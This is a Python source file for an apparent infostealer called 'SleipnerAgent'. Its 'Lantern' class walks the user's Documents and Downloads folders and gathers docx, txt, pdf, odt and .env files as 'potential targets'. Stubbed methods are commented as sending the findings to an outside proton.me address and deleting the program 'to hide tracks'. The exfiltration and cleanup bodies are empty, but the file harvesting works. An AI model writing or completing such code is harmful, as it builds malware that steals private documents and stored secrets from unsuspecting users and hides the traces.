import sys, os, random


class SleipnerAgent:
    def __init__(self):
        self.potential_targets = None
        self.lantern = Lantern()

    def launch(self):
        if self._install_local_nltk():
            self._scan_files()

            for file in self.potential_targets:
                print(file)

        else:
            self.send_results()

    def _install_local_nltk(self) -> bool:
        # Local modules install
        sys.path.insert(0, os.path.abspath("./libs"))
        try:
            import nltk
            from nltk.tokenize import word_tokenize
            from nltk.corpus import stopwords

            nltk_data_path = os.path.abspath("./nltk_data")
            nltk.data.path.append(nltk_data_path)

            if not os.path.exists(os.path.join(nltk_data_path, "tokenizers", "punkt")):
                nltk.download("punkt", quiet=True, download_dir=nltk_data_path)
            if not os.path.exists(os.path.join(nltk_data_path, "corpora", "stopwords")):
                nltk.download("stopwords", quiet=True, download_dir=nltk_data_path)

            self.word_tokenize = word_tokenize
            self.stopwords = stopwords.words("english")

            print("Successfully imported NLTK.")
            return True

        except ImportError:
            print("NLTK not found.")
            return False


    def determine_language(self):
        # Sample 50 files and determine the users preferred language
        if not self.potential_targets: 
            self._scan_files()
        
        file_sample = random.sample(self.potential_targets, 50)
        

    def _scan_files(self):
        # Get all text files in the system
        self.potential_targets = self.lantern.sense_surroundings()

    def send_results(self):
        # Send found results to no-reply-businesssuite@proton.me
        ...

    def clean_tracks(self):
        # Delete self to hide tracks
        ...

    


class Lantern:
    """
    Lantern scans all wanted files in the enviroment and returns
    them in a list as potential target files.
    """
    def __init__(self):
        self.wanted_filetypes = ["docx", "txt", "pdf", "odt", "env"]

    def _shine_lantern(self) -> list:
        user_home = os.path.expanduser("~")
        root_locations = [
            os.path.join(user_home, "Documents"),
            # os.path.join(user_home, "Desktop"),
            os.path.join(user_home, "Downloads")
        ]

        candidate_files = []
        for location in root_locations:
            for root, _, filenames in os.walk(location):
                path_parts = os.path.normpath(root).split(os.sep)
                if 'venv' in path_parts:
                    continue

                candidate_files.extend([
                    os.path.join(root, f)
                    for f in filenames
                    if "." in f and f.split(".")[-1] in self.wanted_filetypes
                ])

        return candidate_files
    
    def sense_surroundings(self) -> list:
        relevant_content = self._shine_lantern()
        return relevant_content